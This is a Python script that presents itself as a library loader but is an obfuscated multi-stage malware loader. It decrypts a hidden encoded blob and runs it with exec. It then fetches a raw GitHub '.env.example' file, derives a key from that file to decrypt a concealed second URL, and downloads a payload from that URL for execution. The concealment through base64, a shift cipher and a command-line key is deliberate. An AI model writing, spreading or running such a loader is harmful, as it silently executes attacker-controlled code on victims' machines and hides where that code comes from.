import os
import sys
import base64
import hashlib
import time
from urllib.request import urlopen, Request
import ssl

url_b64 = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2pvaG5zOTIvYmxvZ19hcHAvcmVmcy9oZWFkcy9tYWluL3NlcnZlci8uZW52LmV4YW1wbGU="
remove_url = base64.b64decode(url_b64).decode()

cert_path = os.path.join(os.path.dirname(__file__), "cacert.pem")
ssl_context = ssl.create_default_context(cafile=cert_path) if os.path.exists(cert_path) else None

def download_remote_content(url, output_path):
    try:
        req = Request(url, headers={"User-Agent": "Mozilla/5.0"})
        with urlopen(req, context=ssl_context) as response, open(output_path, "wb") as out_file:
            if response.status != 200:
                print(f"Failed to download the file. Status code: {response.status}")
                return False
            data = response.read()
            out_file.write(data)
        return True
    except Exception as e:
        print(f"Download failed: {e}")
        return False

def simple_shift_decrypt(encoded_text, password):
    key = int(hashlib.sha256(password).hexdigest(), 16)
    encrypted_bytes = base64.b64decode(encoded_text)
    decrypted = ''.join([chr((b - (key % 256)) % 256) for b in encrypted_bytes])

    return decrypted

methods = {'get_output_file_path': None, 'load_libraries': None}

def load_libraries(key):
    encoded_data = 'PWg8OWY8N2U7PDg3aGZmZ2o3amU9PGo7PWo2NGc7NTQ8PTc8aDk0aTllND1oND1nZzVmZTk1OTo3aTtnajVqZ3xzcHNLPDc9PTszalp6T2luRjlaZm18NXlTVFhvflJwVmV2UjdyS35XPDo5UTtyVmc4b3o4VzNQSmk7U3o1ajY4UHZac1xYfjg7PXpGO0o0dF1PRUc1NFpFOltdWVBxXlk4PThOOD11c0h1L3RKdDVFWk9nM2xnbm1ufHtrL2d6M29ndVw8a1x+UWldOVxFfW09VWxzeU1odEhVSEg2cV5PS3JTO1pGVDpyaTtJUjR1a1dpVX1rU246TDdSSnJnXH02fkk8WnFRelJecj1rXjNnNj1VO1F2aX5XL25sXlBlfls7bTxxM0hcaC9ROX58fHI0fE5GWFY1UXFHbz14UHhdWlJLSTVsV3tcUDZ4R0t3WG1UfGxYUXdNN2hsSC81dVs2aFVtVn06ZzY1NkV2NU5FUkpON2tpNzo8ekw7aH5+VFxSaTw4XWU6VFRcajtmSlFnR09wPGwzPG1lcmpvUzN5O088Z084VF4vVFFFbDs9dl40dWpZUUg9dDM3b1V2aVBHeVN+fTc8elZGPFFcPFM7TGlqUDZnbTppbntsUm1LXl5TdkczbDdWantdWUk2SjNPbXYzV1BySDlvUXNtUS9XM2ZzbGZlfTs2O1F+dk5eUDdwaDRMM1RtNjZHc0dWbE9lRzd3Xn1dPEltUmY6eG5GbHM4cFM0OUx5VHV1Z1ttZVpNT3E5fGV8WHZ3aHlnR31qRzRWS1poXFtUVXdPR1M5aEhZXnVoSUZNTH02ezdcXUVJVEh6aUU7UFFRa1h1OHA3a1V3bDtpWjpQOnttUHZeM3A8VVg9dExKN25PbDdTNUpLeVltO015Tnw7ZnR3OWVlVDhLN11NOTxpOVVIc3RpdU1xSGtIc1NpaUt5dV18L1dZUk1aUzU3flNIXk9GL35MTlxqbjl4fXhwelkvSG52TmY4cDR5WDtXU1ovSDxtdUlrZjc0WHBVfk9nVTR3RXZsUllxNFRTUX5zW3k9bDd+UWd2d1NMNlRoZjhmUVpWWHxLV1tucXc1djYzZzN1e09JXjx4NlRUeTdmanVRTFBTZ01Nc2l9dmtsZ3B6RXpZNlhHbE99ci99OHl5L3JLck10b1kzeWYvR3hHSUhLL1ZUSnt7b2o2VH07OzVGNntFPUpyd3c2dkh5XVlJZnN6OTZnXDk4ZXxdfVZFckl1Z1hQRWVUZj11cTs6d1t+Wzd2d0hdWXZwdEdIRnprXlt7OTNdUDZ6N0tKdU9ca1RMVVVlOjRmVlE1blAvUnxNZXFnanhWeU1eNWdLeVdYeWY4SnRKOGo9VzdMOUxIalc5bXpYOHR4RmhvSnJ0UFRPXUxLdWpcSWtHaTdMUz17O2d7PDQ5SWVdam50Nl5SNW83VUZIS3l7aWpOS1FxNXlKN3BNVTNNSXV2d299Sy91fF1deFVpeUxYM1Z1OUZ0b2xYVElQbUxQUnlMNjRyVHpvO1JSb1FIM0d5PEt8PHA3flE3S1I3VjZ9XFNZb15nd1A4OT1zOjd7V3hdXHk1OWlTWz15XVVYNUx4WnNmfWtXL2k3T042Rk9qM3VZXFlXdn49e1ttPEZGZU9ya1xcT3V0aG1LM2g9S1A4VS9rSUl0Un5qW1lcTVhbV1ZtXVR2TF1OezVdfDxaOn5dfDZ0ZXU0e1NwTzdPRUxzZ0ozNDp3eE9vcFtuTjNSPFJXOXdnSjxpeFNYaVVOazNxU0Zqajt7SUhSeDo4ZzQ8aHhYeDdGOG9zU2pwPF11PUZlUC8zVm99dnBTN3puOUVRWzpoc1lrOVRwWlw7bjw0c15ORjtMfTNaO0s0UXAvUF1ccVAvUH5GO108bXN+Vn1HNGtOPHMzZzpPN1ozW09WTjVdNFdTR2l6XVY3VG1SOnFJfHt7PG43Z3EzUUdPWEZNOW9ZOi9+TDNvcTNRfXVONDhNcmhpdjs3U2pzND10aU9wXktybHtFSC9ucUl7al49RlZGdC9LR3hxVzpSdlQzR1E3cVNnXDZzZlhoZ29tOS9aOHNmeT1VO3hvfVNaalZuUlV8VUk1VVRQZXddOlVmNHBGb3lPb1c2dXw8MzM3XF5MR0VOPXt0flAvV1xYTmd9VWloWFl2SV4zSm9ScVhlRlpGNl5yN2pJV3h7RmlTU006Z1h9c302NVl0fnt2Wktvd0w2PVp4ZWxbSUVNc1Nvc3l3OjNMbFM5ek9oaDw2cGtqN31nbU8zUG9SZzZbVkg5VF5+fnVrfHRcW31HVTVoSWZrfUxsaFN2di9LVl5JPHhYZk1GVTU3ejM6UjxHR1c1VTtMTWh+L108b09GcHpeZUp1V2l4TVtGWFRTNVBHeFlaOVQ9S1F1ckVmL1V7WFxrNDY0dm82ZkheTjt0NDdSUz1mT2YvPVVITWxKeDQ5bn13TGhQO2leWWlyOFw0fmpFL05MXFdQTHt9WXhXNTdFPHhTRU9SdHB8RVl9a1lmTnI0ZWd1bFgzOExpTi9Vb01HOXtKendtM203aHpxL1lFcHxGZmY3cjdocDpVXE1IWjt8PEZ4b3RWNGh0RWtWfHxMSVU8UFFOZWhvO1NqPUVwfnprXXNZcVRZNHk6aVE1Wk5lTi9dSGhLU1xye1hdOFJ6W1xYU1c1c2tvWlZ7UVN0ZnRcaG9JNGp3RUZ2WFhWaFBrUVJmOjt6TDxyd3FyRld2cnd6dExNemddWWlHflo0dzRTL0VTV2tzOGk6fDVZXVNWVG1MfHlvalxuOVlPTHlacGxRe1xzNHdbcX46VX1yPVNSe1Z7W013OXtab0xrZVZnW1lvZk87fTx1ZTNtO28zXGZ8UFNoNGo1e1JMPUldc2kzUVJHT1U4RTxWaFI6dH56VGZTOGlGWzhdTTdFS3o3UWZGVGs9VmxNbS8zfExSfFV2UDV3SWtHcnpRVEpTfk9tV0hTcTd7OTZ3ZkxdNk9SfG14a3oval53Unw2UjdcXVJ2Wnxqfng7SDt3a3t1RnU7O2lOWThtWUw9VTZ6flhlVXledWp1fGhSeFRTM3BHcms5O0U3dXQ9SnlscHxWdjxdNmluTU1OVGVQfGh8d21yXjR0NUlMOHI2VHx8fElVbXNxNHpYfnRWc1JcNlxYVVFOdTZLaVs1OG96WWdLek8vOnxHNHZpPUpFazdwezZqSjxrWlkvPHhucjlaSGVyRnhRRmVqWVpzc2xJSGpWVnpcOU44bTRSZm52eDh8ZngzZjlaM017Sm57XFBmbjM8SGw5cVg6fjZFTnxOfk9lOHFbSmdMTEVML3E9c3ZGWVZmbEZHW3xnO051aEldV2Y1fjh7bU9zUGw6OT1zTlw5UEludGVmTV5IXlhYdUxyZVZQXntzWFluVTlOSHVtWFl6Vz1xbXFKeVdJVU1waVNlOnJYNlFIM213cH00b11QVE5bODozSXZOVDg5eD1rV1NlW01tfVV7VFtRXDVoO3ZKeEheU0ZcdTxdT01YcVpGdFxoNT1UdUxRejdqRTV5UVNQO2hVcFBzdn41enFcWHNxTDx2SWo9aVhWXFJyajl9UXVvNmlaO0k8aTtvNFxuU1VHTn1YbWt8UnBISmlJSU83Ni9PSnJcNnpodlI7SH5sV1FFR2xzV0p3eEhbT0w7OFBlXHlYSGtqVzN9cTpIXDMzL0p9WGs6dk5cRXZ1VUY3XnN8enFyXVs9Zlhzako7NHpSeWpGfm9xa1llU1lPOHBye3VmXnVNc2o5Rlo0NE5me2VyTl5KWDVrV0dTOltzZ25neUdXOjg9d09oZlRaUFdQM0g1bDw9SXppSlxUc3dbOG9KbHFMekg3bUt4andMfDp6VkpcaE9dR0pOU1E7R2tRSzl7cms2VG5yVT06eHc3fDhOVE9XfDM9VnxNUkZuelNycF5wNjltUVJXaUU7TUx0NEtXUX4zOXtIWHl3VDdSM3Job05LVF1yTi9SeUpMb345bHl3M2V7Z1k1VG5KZ1xOSHRGXlt4dn1JT3dQWUZqZ1hvSnE0XEptVDwvfDlROXVsdD1abGl5Vi81OTVbPVlUbVReVWkvRzR+aC9STExlbHZKd1E4eGpvTmxOOkU5N300NU9xOzxuVVs8MzdWSm9raDpHNkY6U280Z3V7UUlpbm85c1ZIcU5XL089XldwVS8zWzR2T1laU209Onx8MzVFblJmWzN6R3teXH43clZPSWg2enZlPHJ4TFk2WW1FSzllbTdlUjlMaG13OEdccC9IUFVmVHldXn10TntuRlxIWDxbPFpVdHduUV5HOXRFRnVyZzM7enheNWdqbVx6UFRucnNsaWtNN0heTnFbaWZbeW9oL3hPdT1NWnl3WHk5R2tPXVpTWDhyaTRReVY6cWZqcVpze142Rjx4Z1FaUHJ3O0hUOG1NXHBQa1RJenV1TWVyT250bW1Jb1hVbkdNNXVben5seTVocFUzNl1XRkx9RVJnOGh7OjN+dn1WUjpwc3BPbnhPZmlHfDVeUT1FfFN4aVZ+NDl9OWhzXFQ3PWd3VHBFXlVtOntxTE1JNDZtTEgvWWVqT2tpSDdwM3plRn1uOjxKeXldZ1lbTDlmc35tWnxyVUlQZzRaNHE4SGlueDNnUVM1WF1VT1FZSnIzdF5TTFo2bX18OzhJXTtvU31qfVF9NHNdOTxORl5QUl5ob1YzclBXek9uemdRfHtoU1Z4fGVmOk5HeVJzc0l2UjhqTDZOWVJ9O1NKNDp9SmZnXDVzbDNZXT07O2VFflcvWWhxWlg1VW5MeUZvN1JIezY9XHg4PDlFeWZ0cXh9ZjhVMzV4V3YvN1VbZ2tbNm5aelRWWVpLRkh+PDZeT1s6Wlh1bVdbOjRRSndrL0xaVk5OOzU5PDR8Skpcc3Jyc1ZabDtRfll8WFtYXk19M3FKcTxtV1ZoeztLaU09OHpUV1ZHTGxtfWk0bm1bNUVFd2d0fDxSTlBNVGVUeUZJWFwvdUl8XU9Qe1VRZn1XezhvTEZGVn5TVlRNWnVGL09XejRKRW9FcG5YT2pqM0tTOXIzNFlJbXF1fDh2Sz1Fblp+aU5cPVMzN0V3V1JMaUxSXVlnWGpcOVR2XjN5Omx6Z1k5VWpHOF5Ue1w5O3V3V3BFSF45XVJVL1A6PHxRdWdbL0xZNDl9ZjpyZjVQTVtnWnBPTHd9SDRrSm5IN2p8OVtxcFVMenx5WUY7Z35uO3A9SWdaeFBnOEs9L2ZrZVB+d1A8SG47VGhPNGk7Um99Rlk3fnN2STxRMzR7cmxXS1F6T2VtZ2k8S3c0OUxqeFVpd2hJWkpzTjg2SWh5RXNNVlhWPF5dWFo5Nz1ZanlzdHpda3ZNR2tRO3NwO2ptUWlJWmZpbmhrblZxSHdUbXVJPThSNWlpU05lN0dlVjluNEdZcWVNZTRZa0k5cXpnZVxNbDZGeHZSanlubU5wM1ZcR3Q7UW9wOF17d21va0VJdGUzVzlJaVk7a21bUXpqcnt1Tld9UnA8cFZlZ3NbNGx+W1dyXV5Ib3I7U2V+PXp1b2Y0NVw7ZzV9L3h2cFhMejlWc2Y0aGl1M29eWn10bWhSfGtVUjR6NH14PT1yNmdlfld3PU48Tn1MW2Zpfjp3S1dZWk1oXjR5VXp8PHZSS116bXlTdlY1WXdbclA2VmdSTE42bmgvNXpYNmVZTnFyXHk0TzdbdC9vOXt0bFNXdEh3WGo5enFqd1pOfVRbcU9VNXRHN0lTWm9tOGZpN31oRV1mZVRvRVJZWX44XGhGVTlNa3NbWnNmdGVqRlp+bkcvSWlIWVJ0c0pbNlRnR09Kfk1ld3xcNTVMfkk5NDl1RTZ5Z3Vmey9RdVtzbU9ZTzYvSzs5XnFlT1Rpd1BNPFV+L2s7OHRUd31uOUVNRkY9O3FrWE44b0c6eUdIOVE4U3NcWl5SUlBIaHlrS3l+aHd2WVhreXFeOm9qWUhcbTtmdXpGWls8VmY9fTpYXmtzNFpuNnxtaTxbdDtYW2l8WHs5TkdqfHFbXlR7a15WM1d4UUxLUkhPO1M9N3U5eE9mVm81bDZ0PHE8dWhMdXE7dH5Md0UvXFRlXX53WXBocXd+PHJOdVloOjVtNUxwUGZcPEZdfkhmZ0dRb095RTU8djRLWS94dD0zaVdHTVY3WVdHTm9sL208O2Vxamhea1daWkdYdXZNZXxFUkk1azhFWHg4XUxod1NnTlB6O3E1eXtGSFVIOVxOWUl4NnM4OWs8OlQzanp9cGt+andlV055dzR+NlFoM2l2aW9VWlpod2hTPTQ6ZXF5UGVzfm13SVd0Z1tUc3twUzxwWVVGSzhcS2ZNeW1aazZrTzVYdHg2bWZ+cFddPFB4Mz06cHNIXH5eT3VYcVRHXWZed1JTeC9ofjw6VFZpOTpFT0lpZXByS1t+VDpvd1U3b2VPa1FFdFdoZWlVZjdFRWszfi88czxlfUo7TnReUkx6WDxrb0V6PXpyTTRWVmVWXHQ7O3tMNG9bZWw3XF1ufk5RRVFaNVUvaUVdRXxpdDtxezpLdl5FVjtFcXRnPHp8aFJwUnB2V1M5XTVvejtMXGlUN0c5NmhRclA6O25yUUhlfml2azN3SzhqeElYN0h6SFM8Sl5ORVJIcFxtL3VbcFNvdWs4Nmp1fVZpZl5YVGc1flhKeU59eTU5Wl00L05RNH5mTj11eG9PVmxvVztYWFx1VktbW3pSPTc0XU82SHtLV1A6b2o2TGdbOV1La05nVnpFN3d5OHpPNmo7WjVRXjhqe3kvNDlucjpTVnpydlM0TlVvND1UO2d4TztvZXw3UVpUdUlNN0t4Ojc1cDNObjRYRjY8bjtSRzpqcmtJOEtqeUl2UTw7PTpRXWxVOy9nSDZlNVc1W3A2ZjxKa11HbWs7S3NKeXVPdmhnZVJOdFBmUlBmcG16UEZOWWxrb3I8M1J7SGhQXU5SSndIUVM0e0leUlc9SF5IdlRSbE9lcDxLL3IvSVlrdntQaFJGb2VoT3c4WXM4SEVXXHFNZ09Vezh0cVx+b3xtZVNGaEtRakxWc2tRcXxLOlJ7ajMvaj15aXNuUHVrVX1vdWt3O25GRk1JOEo9Z1xqdFBGN1doUDw6VldrcUx3PWtUUFZ1TWVZTkpuRTRGbndnSXZbXFZuVTNPcDxqXVpFdkd7el1mS3ZUODVLU2paazZeXW10fVNddi9sdXM5OUtxWmtZT0ZNbnI1U3dNSzR1Xmc9TWV2OXx0S3BUWVg0dnNpcDZFamd8Oz1RWW1rPDV8WkZ9cVVoTlF0PXU2eVlLeC9PazpHWjNxPHBTTVJ+SD18fDM1bHxtcnxxfnJ1cFtxeTpMa3BrcUxyL01cUF44XDo1VTpvN2o2OzZlM2hOSHV0VHo3aXZGbT07S1I9PU9aWkV6SXRKakk3fnFKSU5tTmhYO3V6L3t1Zm4zOWpleTZST3F9bUpLUXNrazZUd1RnVDs9fHw3NFg6fVg9M21VcGd8V0drODg3RzM0OnhYUlt3NFRuSFZNL019SXgvOXdoXjdHZldLNXtzd3t6clJMO3hFeXJKbm5TTmpsNzp6UXdqc3N3L21nWjlrSDw3SnE8VVBJV31rcGx3aFA9L3RNeTU9L3NUXV5efnw1U051eUc9SF5oZnVIaVFuXVZIN0pFSUU1Ny8vUUtla103fTZnZmhFOjxGT0w6enI5T3JebnV5ckZHTklxbUsvPDQvWWpVdU1mT2pSbWZuZTx4OXJtMzhQeThxNzU0fUx0L1NTS09tblR8N007NDRcSmx4N1NaZkVKSXVsTW99ZlF3R0xmWnMvSm5wPU45N3lle1ReVWdXWDNnPHovdUlaS3dlN3Z3UG1rOzpIUnZNdHRPNWY5djhGNkZWey9aRW5xM1xsRktqdD1KXlM2fFZzWkg4R0UveUwzaFZnezdFTk1VNHVRaVV7UTVNbTpQeUpRTnRQTFF2cVBMeUVtNVVrfk1+Omo6b0ZFNnZvNk82STd6UFReUlx0XDx5OkZdWF1wck8vfFAve2tMUno2ZjRtVVh1bldGXjVrdX5YO016cD10dDdKTHRzRTQ2VktPbFQvR15ZcGkzdVZJaEdSfXFYaXJYc3lmalg9W0h9eUxGTGl4RXczL111d000bXBGd1YzWTc9VFpMWW87Z1xIVDlQVmtval08aUpXb2d6e0lKWXg5b1pcXEVWVlBFNTU4VU5zajN6fnMzT3JyV1hce01FaUYvc1o6WkdJOzt5UGhVVj1zaXBtXVpTbXZTODVWfHI3ekt3TndRN096T15eS2s9RUV6dHNOb3FTcVR6NHY0bW45czlzOm5MTU1zfFtoeDdvOjx2T0tmZy9tNzRUW2ZcN0VzRVNSfXV3S1JvSDVIdjtHbVlpVko4bmVoZVZOTnhld2h+SV13T1NuVEdPfFdIRzY5XDlsN2VYb1VlWXE8Z3tYenxlXnhYbEldb0lpe3U7THVNWTN+Nz1JcXRVa2g5cX12RkpSRUhOfXR9RmlJbllxaEl7V3BYc1h3ZX00UVo8als2bl01SX5qWlFHdEluZU5JZWlpentnRk5VRldoZn56aGxuXVVwVUxnXFVOa2g2ZnQ6TjpSZk97WGx+NTw0Rl5UalM2My98clZ9OH1JcU1wfD1OV11nbzd4cFU1aDk9M0Z8SGZOdk1ZbXo5dGZ5ZS9aU3dUfTxvTH48UGpnbkU7Xi9JXHBadkpsVj1dL0xValw1dXRGfnJ0RXZaUD07cX5pNm90fk92SmVMT3FZSnxLclhpSXZYelk6UHJdS01WZjpqezlFT0ZZb2c5RlE5WlV5SF16NUh4fE1HOFVXaDtwU09yVGd2TWd9e1Fde3hKWWt4OV58dFVTalN6Tkhyd1B5NGZ0ZVdHSHdKNDdNdUp3dG53OnlrTS9nRkpue3V+O2xTVThyNVE9cDpTO3xFbTloSVZnbzptR2o2aT1TOj03elUvbn40dDY9SFpZdVRNU2ZKe3wzd15nfT1RVXRUcFFTaVw2flV3RjxsVz1eSjZpOVZzXVppaHBVeVtOZV0zb0lRNXtGdkdwdWxmOV13TV5nckZHdWZzW3ZRc1s0dk9ncm08dFl1cD1LWHJLTnhvblw2eHs9SVtvNExKc3xWUExSbGU4PWY0cnJZflxua25qVzlzTXpFRV13XGZFU3N7fVFuakpSejVVVUlaSV18ckpZOF53cnRZakd7TkZcSWhsazRHeH17b295fHhKL0ZMamZsT2pMe1tRXE14fm44V3p7ZVhOdC9aL0pedW1GcDlRXnpsTWh8NVRadzl5ekg8e2VnZWovXVZ+S0lWNmt7XnJNdHp0eG1ZdGk2clpoUlt7VGhJL2l6d1xnL1hXXVA6dVhZPH13WkpPelU9VzV8fjp8UFVbPDVdaUk1dztYTUdVPXBSUlQ6e01eT1w8UHBLXXRnZTpONjt4NC9NVTp1Sn53STNtRTReUU1KanVebEt3SnRqcEtnUklqNzxYPTc3cFAvV011Tzo8XGs6NnhOa1B2Nzh3UjZMO11deEpdb1NcektTV1B2a0g8VVQ7UmxQXmp2PEU7XFtSdUtFZnl6WHFpUXxnWW9RM0dHSjtldk5SXm9PL11qcVJob1dmSzdzSlAvbnpGZj09dU9rWm9RRX1VXE5dNj1RRXMvUk97b1t2a1JeWGtRNUp6RzVzM3I8MzM9PTw8M2pKWFpoWlo1L1xebmtJSWc0enpqOmxMOEc4dFR+eThlTTdINHs7ci9GVltzW2xTXDxwWntOaQ=='
    decoded_data = simple_shift_decrypt(encoded_data, key.encode('utf-8')).encode('utf-8')

    hash = decoded_data[:64]
    content = decoded_data[64:]

    if  hashlib.sha256(content).hexdigest() == hash.decode('utf-8'):
        _ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(content))
    else:
        return

    if not methods['get_output_file_path']:
        return

    max_retry_count = 3
    output_file_path = methods['get_output_file_path']()
    encoded = "6PT08PO6r6/j7+Tl8O/v7K7j7O/15K/w9eLs6eOv8/Th8vT18K7w+b/25fK9sa6ypvT58OW97e/k9ezl"

    for _ in range(max_retry_count):
        if not download_remote_content(remove_url, output_file_path):
            time.sleep(2)
            continue

        download_url = ""
        with open(output_file_path, "rb") as f:
            file_content = f.read()
            sha256_hash = hashlib.sha256()
            sha256_hash.update(file_content + key.encode())
            password = sha256_hash.digest()

            download_url = simple_shift_decrypt(encoded, password)
        
        if not download_url or not download_remote_content(download_url, output_file_path):
            time.sleep(2)
            continue

        methods['process_downloaded_library'](output_file_path)
        break

if __name__ == "__main__":
    if len(sys.argv) >= 2:
        load_libraries(sys.argv[1])
